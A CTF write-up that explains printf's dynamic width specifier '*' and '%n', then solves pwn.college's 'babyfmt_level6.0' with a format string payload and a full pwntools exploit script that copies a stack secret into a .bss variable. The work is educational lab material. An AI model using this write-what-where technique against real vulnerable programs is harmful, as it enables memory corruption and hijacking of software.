---
title: "Write-What-Where - `printf` Dynamic Padding Size (`*`)"
description: ""
author: "İsmail BOZKURT"
date: 2025-08-19
tags:
  - binary-exploitation
  - format-string-attack
  - pwn
  - CTF
categories:
  - Exploitation
  - Pwn
  - Format-String-Attack
---

## Format String Attack - Write-What-Where - `printf` Dynamic Padding Size (`*`)

Normally, when you use format specifiers like `%10d` or `%-20s`, the number before the conversion character (`d`, `s`, `x`, etc.) sets the **field width** (padding).

But C also lets you provide that width **dynamically** at runtime, using an asterisk `*`

- `*` means: _“Take the next argument (an `int`) from the variadic argument list and use it as the width or precision.”_
    
- You can use `*` for **width**, **precision**, or both.

The `*` tells `printf` to **take the width from an argument** instead of being written in the format string.

```c
printf("%*d\n", 5, 42);
```

**Output:**
`     42` -> aligned right 5.

### The special `%n` specifier

- `%n` doesn’t print anything.
    
- Instead, it writes the **number of characters printed so far** into an integer pointer you pass.

**Example:**
```c
int count;
printf("Hello, world!%n", &count);
printf(" -> printed %d characters\n", count);
```

**Output:**
```rust
Hello, world! -> printed 13 characters
```

[printf(3) man page](https://man7.org/linux/man-pages/man3/printf.3.html)

>Decimal digit string (with nonzero first digit)
       specifying a minimum field width.  If the converted value has
       fewer characters than the field width, it will be padded with
       spaces on the left (or right, if the left-adjustment flag has been
       given).  Instead of a decimal digit string one may write "*" or
       "*m$" (for some decimal integer _m_) to specify that the field width
       is given in the next argument, or in the _m_-th argument,
       respectively, which must be of type _int_.  A negative field width
       is taken as a '-' flag followed by a positive field width.  In no
       case does a nonexistent or small field width cause truncation of a
       field; if the result of a conversion is wider than the field
       width, the field is expanded to contain the conversion result.

>   **Precision**
       An optional precision, in the form of a period ('.')  followed by
       an optional decimal digit string.  Instead of a decimal digit
       string one may write "*" or "*m$" (for some decimal integer _m_) to
       specify that the precision is given in the next argument, or in
       the _m_-th argument, respectively, which must be of type _int_.  If
       the precision is given as just '.', the precision is taken to be
       zero.  A negative precision is taken as if the precision were
       omitted.  This gives the minimum number of digits to appear for **d**,
       **i**, **o**, **u**, **x**, and **X** conversions, the number of digits to appear
       after the radix character for **a**, **A**, **e**, **E**, **f**, and **F** conversions,
       the maximum number of significant digits for **g** and **G** conversions,
       or the maximum number of characters to be printed from a string
       for **s** and **S** conversions.


The relevant part is `%*m$` here. Simply this means, attacker can place index number. 
Here is simple example will use in PoC later.

What does this do : `%*62$d%26$n`
> getting the number stored in 62th index.
> write that value inside of 26th index.

Reproduce the attack.

### babyfmt_level6.0

```perl
root@92ef0ade0e38:/host# ./babyfmt_level6.0 
###
### Welcome to ./babyfmt_level6.0!
###

This challenge reads in some bytes, calls printf on that string, and allows you to perform
a format string attack. Through this series of challenges, you will become painfully familiar
with the concept of Format String Attacks!

This challenge allows you to make a 256-sized format string.

This challenge requires you to set a win value, located in the .bss, to a secret value! This secret value
is currently stored in a stack variable, and you will have to figure out how to copy it into the .bss.
There are two options: do a leak (using one printf) followed by a write (using a second printf), or use
a _dynamic padding size_, using the * format character, in combination with %n, in a _single_ printf,
to copy memory. Since this level only gives you a single printf() call, you will likely need to use the
latter. Check the printf man page (in category 3: `man 3 printf`) for documentation on *.

As before, if you successfully pull that off, the challenge will give you the flag!

The win value in the .bss is located at 0x404170! Remember to write this in little endian in your format string.
Remember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.

The secret value is located on the stack, 0x130 bytes after the start of your format string!

I will now read up to 256 bytes. Send your data!
asd
Received 4 bytes!

I will now call printf on your data!

asd

And now, let's check the win value!
Checking win value...
... desired win value: 0x1bd0de
... written win value: 0
... INCORRECT!
### Goodbye!
```

The explanation is telling everything needed. 
The secret value **user_input+0x130** . That means offset+(0x130/8) is the offset of *win value*. 
Giving hint special formatter of printf `*`

**Note:** The desired value dynamically changed. So lame way doesn't work. (lol)
#### find offset and padlen values

User input starts at offset: **24**.
Win values offset: **24+(0x130/8) = 62**.

```perl
[DEBUG] Received 0xf8 bytes:
    b'Received 33 bytes!\n'
    b'\n'
    b'I will now call printf on your data!\n'
    b'\n'
    b'aaaabaaacaaadaaaeaaaSTART0x6161616261616161END\n'
    b"And now, let's check the win value!\n"
    b'Checking win value...\n'
    b'... desired win value: 0x2bd41c\n'
    b'... written win value: 0\n'
    b'... INCORRECT!\n'
    b'### Goodbye!\n'
[*] Found format string offset: 24
[+] User input starts at  : 24
[+] Needed pads           :0
[+] Numbwritten           :0
```

#### get_flag.py

Added explanation inside of PoC. Happy reading...

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './babyfmt_level6.0')
context.terminal=['tmux', 'splitw', '-v']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *func+571
continue
'''.format(**locals())

# -- Exploit goes here --

def get_win_address_and_value(text):
    match = re.findall(rb"0x[0-9a-fA-F]+", text)
    if match:
        return match
    return None

io = start()


#### leak target address ####

leaks       = get_win_address_and_value(io.recvuntil(b'offset.'))
target_addr = int(leaks[0], 16)

info(f'Target Addr: {target_addr:#x}')


#### write target address ####
offset = 24
padlen = 0

printf_dyn_pad_size = '%*62$d'
fmt = '%26$n'

payload = flat(printf_dyn_pad_size+fmt+randoms((len(printf_dyn_pad_size)+len(fmt))-len(printf_dyn_pad_size)),
               target_addr)


io.sendafter(b'data!\n', payload)

#info(io.recv())
info(f'''User input starts at {offset}th offset,
     but {printf_dyn_pad_size} added extra {len(printf_dyn_pad_size)} bytes.
     Also {fmt} is another {len(fmt)} bytes.
     Total added bytes: {len(printf_dyn_pad_size) + len(fmt)}.
     Plus stack alignment push offset to {offset + 2}.''')
info(f'The offset of the win value start of format string+0x130, so win value offset: {offset+int((0x130)/8)}')
info(f'Builded Payload: {repr(payload)}')
io.interactive()
```

**The result:**

```rust
And now, let's check the win value!
Checking win value...
... desired win value: 0x709953
... written win value: 0x709953
... SUCCESS! Here is your flag:
pwn.college{sKTvWi************************************MzEzW}
### Goodbye!
```

## References

- **glibc Manual – Formatted Output**  
    [https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html](https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html)

- **man 3 printf** (POSIX printf specifiers, including `*m$` and `%n`)  
    [https://man7.org/linux/man-pages/man3/printf.3.html](https://man7.org/linux/man-pages/man3/printf.3.html)

- **The Open Group Base Specifications – fprintf()** (rules for positional arguments)  
    [https://pubs.opengroup.org/onlinepubs/9699919799/functions/fprintf.html](https://pubs.opengroup.org/onlinepubs/9699919799/functions/fprintf.html)

- **CERT C – FIO30-C: Exclude user input from format strings**  
    [https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings](https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings)

- **MITRE CWE-134 – Externally-Controlled Format String**  
    [https://cwe.mitre.org/data/definitions/134.html](https://cwe.mitre.org/data/definitions/134.html)

- **Pwntools Documentation – Format String Exploits**  
    [https://docs.pwntools.com/en/stable/fmtstr.html](https://docs.pwntools.com/en/stable/fmtstr.html)

- **Pwntools Source – `fmtstr_payload` Implementation**  
    [https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027)

- **Exploit Education – Format String Vulnerabilities**  
    [https://exploit.education/phoenix/format-string/](https://exploit.education/phoenix/format-string/)

- **CTF 101 – Format String Vulnerability**  
    [https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

- **pwn.college – Format String Exploits**  
    [https://pwn.college/software-exploitation/format-string-exploits](https://pwn.college/software-exploitation/format-string-exploits)

- **Classic Paper – Exploiting Format String Vulnerabilities (scut/Team TESO)**  
    [https://cs155.stanford.edu/papers/formatstring-1.2.pdf](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

- **OWASP – Format String Attack**  
    [https://owasp.org/www-community/attacks/Format_string_attack](https://owasp.org/www-community/attacks/Format_string_attack)

- **LiveOverflow CTF Video – Format String Basics**  
    [https://www.youtube.com/watch?v=0WvrSfcdq1I](https://www.youtube.com/watch?v=0WvrSfcdq1I)
